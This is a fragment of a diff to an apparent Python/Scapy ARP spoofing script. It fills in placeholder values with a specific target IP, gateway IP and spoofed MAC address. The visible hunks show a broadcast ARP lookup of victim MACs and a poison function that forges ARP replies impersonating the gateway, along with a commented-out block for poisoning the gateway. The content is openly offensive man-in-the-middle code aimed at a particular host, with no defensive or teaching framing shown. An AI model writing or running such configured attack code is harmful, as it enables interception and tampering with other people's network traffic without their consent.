@@ -8,9 +8,9 @@ import signal
 
 interface = "wlp3s0"
 
-target_ip = "INPUT HERE"
+target_ip = "192.168.88.104"
 
-gateway_ip = "INPUT HERE"
+gateway_ip = "192.168.88.88"
 
 def get_mac(ip):
     responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,retry=10)
@@ -27,7 +27,7 @@ def poison(gateway_ip, gateway_mac, target_ip, target_mac):
     poison_target.psrc = gateway_ip
     poison_target.pdst = target_ip
     poison_target.hwdst = target_mac
-    poison_target.hwsrc = "INPUT HERE"
+    poison_target.hwsrc = "48:5d:60:5a:7d:53"
 
 #    poison_gateway = ARP()
 #    poison_gateway.op = 2
